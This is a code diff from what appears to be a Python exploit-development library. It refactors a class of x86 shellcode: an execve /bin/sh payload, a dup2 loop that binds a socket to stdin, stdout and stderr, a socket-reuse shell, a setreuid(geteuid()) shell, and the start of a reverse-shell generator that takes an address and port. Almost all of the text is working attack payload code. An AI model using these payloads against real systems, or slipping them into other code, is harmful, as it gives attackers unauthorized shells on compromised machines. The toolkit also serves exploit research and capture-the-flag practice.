@@ -178,7 +178,8 @@ class x86_64:
 
 
 class x86_shellcode:
-    shell = x86.assemble(""" ; execve("/bin//sh", 0, 0);
+    # execve("/bin//sh", 0, 0), 21 bytes
+    shell = x86.assemble("""
         xor ecx, ecx
         mul ecx
         push ecx
@@ -188,7 +189,8 @@ class x86_shellcode:
         mov al, 11
         int 0x80
         """)
-    dup2_ebx = x86.assemble(""" ; dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
+    # dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
+    dup2_ebx = x86.assemble("""
         ; assume that socket fd is in ebx
         push 0x2
         pop ecx    ;set loop-counter
@@ -198,8 +200,9 @@ class x86_shellcode:
         int 0x80         ;exec sys_dup2
         dec ecx             ;decrement loop-counter
         jns duploop         ;as long as SF is not set -> jmp to loop
-    """)
-    shell_sock_reuse = x86.assemble(""" ; ebx = dup(2) - 1; dup2_ebx; shell
+        """)
+    # ebx = dup(2) - 1
+    dup_sock = x86.assemble("""
         push 2
         pop ebx
         push 0x29
@@ -207,17 +210,24 @@ class x86_shellcode:
         int 0x80
         dec eax
         mov ebx, eax
-        """) + dup2_ebx + shell
-    # setuid(geteuid()); system("/bin/sh")
-    shell_euid = x86.assemble(""" ; setuid(geteuid()); shell
+        """)
+    shell_sock_reuse = dup_sock + dup2_ebx + shell
+    # setreuid(geteuid(),geteuid())
+    seteuid = x86.assemble("""
+        ; geteuid
+        xor eax, eax
+        mov al, 0x31
+        int 0x80
+
+        ; setreuid
+        mov ebx, eax
+        mov ecx, eax
         xor eax, eax
         mov al, 0x46
-        xor ebx, ebx
-        mov bx, 0x1fa
-        xor ecx, ecx
-        mov cx, 0x1fa
         int 0x80
-        """) + shell
+        """)
+    shell_euid = seteuid + shell
+
     @staticmethod
     def shell_reverse(addr, port):
         addr = "0x" + "".join("%02x" % int(x) for x in reversed(addr.split(".")))
